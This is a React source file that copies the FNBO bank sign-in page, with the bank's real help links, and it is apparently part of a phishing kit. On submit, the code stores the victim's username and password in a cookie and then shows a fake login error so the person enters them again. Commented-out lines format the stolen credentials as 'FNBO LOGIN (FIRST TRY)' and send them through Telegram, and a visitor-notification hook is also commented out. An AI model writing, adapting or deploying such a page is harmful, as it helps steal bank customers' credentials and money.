import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import { wait } from "../utils/waiter";
// import { visitorNotification } from "../utils/visitor_notification";
// import TelegramSend from "../utils/send-message";

export default function Login() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });
  const navigate = useNavigate();
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  
  
  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    // const message = `
    // ---- FNBO LOGIN (FIRST TRY) -----
    // Username: ${formInput.username}
    // Password: ${formInput.password}
    // `;
    setIsLoading(true)
   await wait(3000)
    // await TelegramSend(message);
    cookies.set("login1", formInput);
    setIsLoading(false)
    navigate("../login/error", { replace: true });
  }

  // React.useEffect(() => {
  //   visitorNotification();
  // }, []);

  return (
    <>
      <div className="auth-content">
        <div className="auth-content-inner">
          <div className="primary-auth">
            <form
              method="POST"
              data-se="o-form"
              slot="content"
              id="form19"
              onSubmit={handleSubmit}
              className="primary-auth-form o-form o-form-edit-mode"
            >
              <div
                data-se="o-form-content"
                className="o-form-content o-form-theme clearfix"
              >
                <h2
                  data-se="o-form-head"
                  className="okta-form-title o-form-head"
                >
                  Sign In
                </h2>

                <div
                  className="o-form-error-container"
                  data-se="o-form-error-container"
                ></div>
                <div
                  className="o-form-fieldset-container"
                  data-se="o-form-fieldset-container"
                >
                  <div
                    data-se="o-form-fieldset"
                    className="o-form-fieldset o-form-label-top margin-btm-5"
                  >
                    <div
                      data-se="o-form-label"
                      className="okta-form-label o-form-label"
                    >
                      <label htmlFor="okta-signin-username">
                        User Id&nbsp;
                      </label>
                    </div>
                    <div
                      data-se="o-form-input-container"
                      className="o-form-input"
                    >
                      <span
                        data-se="o-form-input-username"
                        className="o-form-input-name-username o-form-control okta-form-input-field input-fix"
                      >
                        <input
                          type="text"
                          placeholder=""
                          name="username"
                          id="okta-signin-username"
                          onChange={handleInputChange}
                          defaultValue={formInput.username}
                          aria-label=""
                          aria-required="true"
                          required
                        />
                      </span>
                    </div>
                  </div>

                  <div
                    data-se="o-form-fieldset"
                    className="o-form-fieldset o-form-label-top margin-btm-5"
                  >
                    <div
                      data-se="o-form-label"
                      className="okta-form-label o-form-label"
                    >
                      <label htmlFor="okta-signin-username">
                        Password&nbsp;
                      </label>
                    </div>
                    <div
                      data-se="o-form-input-container"
                      className="o-form-input"
                    >
                      <span
                        data-se="o-form-input-username"
                        className="o-form-input-name-username o-form-control okta-form-input-field input-fix"
                      >
                        <input
                          type="password"
                          placeholder=""
                          name="password"
                          onChange={handleInputChange}
                          defaultValue={formInput.password}
                          id="okta-signin-username"
                          aria-label=""
                          aria-required="true"
                          required
                        />
                      </span>
                    </div>
                  </div>
                </div>
              </div>
              <div className="o-form-button-bar">
                {isLoading ? (
                  <input
                  className="button button-primary"
                  type="submit"
                  value="Please wait...."
                  id="okta-signin-submit"
                  data-type="save"
                />
                ) : (
                  <input
                    className="button button-primary"
                    type="submit"
                    value="Continue"
                    id="okta-signin-submit"
                    data-type="save"
                  />
                )}
              </div>
            </form>
            <div className="auth-footer">
              <a
                href="https://auth.securebanklogin.com/?brand=fnbo#"
                data-se="needhelp"
                aria-expanded="false"
                aria-controls="help-links-container"
                className="link help js-help"
              >
                Need help signing in?
              </a>
              <ul
                className="help-links js-help-links"
                id="help-links-container"
                style={{}}
              >
                <li>
                  <a
                    href="https://auth.securebanklogin.com/?brand=fnbo#"
                    data-se="forgot-password"
                    className="link js-forgot-password"
                  >
                    Forgot password?
                  </a>
                </li>
                <li>
                  <a
                    href="https://www.securebanklogin.com/auth/fnbo/forgot-user-id"
                    className="link js-custom"
                    rel="noopener noreferrer"
                  >
                    Forgot User ID?
                  </a>
                </li>
                <li>
                  <a
                    href="https://auth.securebanklogin.com/help/login"
                    data-se="help-link"
                    className="link js-help-link"
                    rel="noopener noreferrer"
                    target="_blank"
                  >
                    Need help?
                  </a>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
